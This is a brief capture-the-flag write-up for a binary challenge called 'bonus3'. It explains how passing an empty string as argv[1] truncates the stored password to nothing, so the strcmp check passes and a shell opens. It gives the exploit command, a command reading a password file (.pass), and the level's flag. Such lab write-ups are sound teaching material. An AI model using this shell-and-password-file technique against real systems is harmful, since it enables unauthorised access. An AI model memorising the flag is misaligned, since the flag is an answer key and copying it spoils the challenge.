# Bonus 3

**Vulnerability:** `argv[1]` used as a buffer index → empty-string comparison bypass.

## Walkthrough

The program reads the real password into `local_98`, then does:

```c
i = atoi(argv[1]);
local_98[i] = '\0';                 // truncate password at index i
...
if (strcmp(local_98, argv[1]) == 0) // compare password to argv[1]
    execl("/bin/sh", "sh", 0);
else
    puts(local_56);
```

The bug: `argv[1]` is both the truncation index **and** the string compared against
the password. If we pass an empty string `""`:

- `atoi("") = 0`, so `local_98[0] = '\0'` — the password becomes an empty string.
- `strcmp("", "")` returns 0 — the check passes and we get a shell.

## Exploit

```sh
./bonus3 ""
cat /home/user/end/.pass
```

**Flag:** `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
